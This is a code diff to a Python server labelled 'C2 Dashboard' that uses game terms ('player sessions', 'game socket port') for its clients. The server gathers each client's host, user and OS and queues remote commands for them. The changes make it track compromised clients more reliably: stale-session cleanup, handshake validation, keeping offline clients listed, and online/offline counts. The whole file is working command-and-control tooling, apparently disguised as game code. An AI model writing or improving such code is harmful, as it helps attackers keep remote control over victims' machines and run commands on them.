@@ -51,6 +51,8 @@ class PlayerSession:
         self.lock = threading.Lock()
         self._running = True
         self.last_heartbeat = time.time()
+        self.connected_at = time.time()
+        self.disconnected_at = None
 
     def send_admin_command(self, command):
         """Queue an admin command for the player client."""
@@ -174,24 +176,45 @@ def player_sender(session):
     session._running = False
 
 
+def stale_session_cleanup():
+    """Background thread: marks stale sessions offline and purges very old ones."""
+    while True:
+        time.sleep(30)
+        now = time.time()
+        to_close = []
+        to_purge = []
+        with session_lock:
+            for pid, sess in list(active_sessions.items()):
+                # Mark truly stale online sessions as offline
+                if sess.online and (now - sess.last_heartbeat > 120):
+                    sess.online = False
+                    sess.disconnected_at = now
+                    try:
+                        sess.socket.close()
+                    except:
+                        pass
+                    print(f"[!] {pid} marked stale (no heartbeat)")
+                # Purge sessions offline for > 7 days to prevent memory bloat
+                if not sess.online and sess.disconnected_at and (now - sess.disconnected_at > 604800):
+                    to_purge.append(pid)
+            for pid in to_purge:
+                active_sessions.pop(pid, None)
+                print(f"[*] Purged old offline session: {pid}")
+
+
 def handle_player(client_socket, addr):
     """Handle a new player connection."""
     player_id = f"player_{uuid.uuid4().hex[:8]}"
     session = PlayerSession(client_socket, player_id, addr)
 
-    with session_lock:
-        active_sessions[player_id] = session
-
     print(f"[*] New player session: {player_id} from {addr}")
 
-    # Receive player system info
+    # Receive player system info BEFORE adding to dashboard
     try:
         info = net_recv(client_socket, timeout=10)
     except (ConnectionResetError, BrokenPipeError, OSError):
         print(f"[!] {player_id} disconnected before handshake")
         session.close()
-        with session_lock:
-            active_sessions.pop(player_id, None)
         return
 
     if info:
@@ -200,14 +223,21 @@ def handle_player(client_socket, addr):
             if '=' in p:
                 k, v = p.split('=', 1)
                 pairs[k.lower()] = v
+        # Validate: must have at least host or user to be a real client
+        if not pairs.get('host') and not pairs.get('user'):
+            print(f"[!] {player_id} invalid handshake (no host/user): {info[:100]}")
+            session.close()
+            return
         session.system_info = pairs
         print(f"[*] {player_id} system: {pairs}")
     else:
         print(f"[!] {player_id} no handshake data")
         session.close()
-        with session_lock:
-            active_sessions.pop(player_id, None)
         return
+
+    # NOW add to dashboard — only validated clients get here
+    with session_lock:
+        active_sessions[player_id] = session
 
     # Start receiver and sender threads
     session._running = True
@@ -221,9 +251,16 @@ def handle_player(client_socket, addr):
     recv_thread.join()
     send_thread.join()
 
+    # Mark offline but KEEP in dashboard until manually deleted
     with session_lock:
-        active_sessions.pop(player_id, None)
-    print(f"[*] Player session ended: {player_id}")
+        if player_id in active_sessions:
+            active_sessions[player_id].online = False
+            active_sessions[player_id].disconnected_at = time.time()
+            try:
+                active_sessions[player_id].socket.close()
+            except:
+                pass
+    print(f"[*] Player session offline: {player_id}")
 
 
 # ============ DASHBOARD ============
@@ -295,7 +332,7 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 </style></head>
 <body>
 <h1>C2 Dashboard <a href="/logout" class="logout">Logout</a></h1>
-<p>Server: {{ host }}:{{ port }} | Clients: {{ count }}</p>
+<p>Server: {{ host }}:{{ port }} | Total: {{ count }} | Online: {{ online_count }} | Offline: {{ count - online_count }}</p>
 <table>
 <tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Command</th><th>Action</th></tr>
 {% for cid, c in clients.items() %}
@@ -305,7 +342,7 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <td>{{ c.system_info.get('user', 'unknown') }}</td>
 <td>{{ c.system_info.get('system', 'unknown') }}</td>
 <td class="{{ 'online' if c.online else 'offline' }}">{{ 'Online' if c.online else 'Offline' }}</td>
-<td>{{ '%.0f'|format(time.time() - c.last_heartbeat) }}s ago</td>
+<td>{{ '%.0f'|format(time.time() - c.last_heartbeat) }}s ago{{ ' (disconnected ' + '%.0f'|format(time.time() - c.disconnected_at) + 's ago)' if c.disconnected_at else '' }}</td>
 <td>
 <form method="POST" action="/send_command" style="display:inline;" id="form-{{ cid }}">
 <input type="hidden" name="client_id" value="{{ cid }}">
@@ -465,11 +502,13 @@ if app:
     def dashboard():
         with session_lock:
             clients = dict(active_sessions)
+            online_count = sum(1 for c in clients.values() if c.online)
         return render_template_string(DASHBOARD_TEMPLATE,
             clients=clients,
             host=GAME_HOST,
             port=GAME_SOCKET_PORT,
             count=len(clients),
+            online_count=online_count,
             time=time,
             datetime=datetime)
 
@@ -565,6 +604,11 @@ def start_dashboard():
 
 
 if __name__ == '__main__':
+    # Start stale session cleanup (marks dead sessions offline, purges old ones)
+    cleanup_thread = threading.Thread(target=stale_session_cleanup)
+    cleanup_thread.daemon = True
+    cleanup_thread.start()
+
     # Start game socket server
     socket_thread = threading.Thread(target=start_socket_server)
     socket_thread.daemon = True
